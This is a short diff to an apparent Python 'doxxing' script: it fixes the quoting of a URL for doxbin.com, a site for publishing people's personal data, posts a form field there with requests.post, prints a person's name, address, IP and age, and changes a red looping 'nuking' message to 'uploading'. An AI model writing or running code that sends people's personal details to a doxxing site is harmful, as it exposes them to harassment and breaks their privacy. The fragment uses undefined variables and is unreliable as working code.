@@ -96,7 +96,7 @@ for i in range(5):
 
 import requests
 
-url = 'http://doxbin.com
+url = 'http://doxbin.com'
 query = {'field': value}
 res = requests.post(url, data=query)
 print(first_name + " " + last_name + " " + address + " " + ip + " " + age)
@@ -104,5 +104,5 @@ print(first_name + " " + last_name + " " + address + " " + ip + " " + age)
 import time
 
 for i in range(10000):
-    print("\033[31m\n nuking [!]", end=' ', flush=True)
+    print("\033[31m\n uploading [!]", end=' ', flush=True)
     time.sleep(0.01)
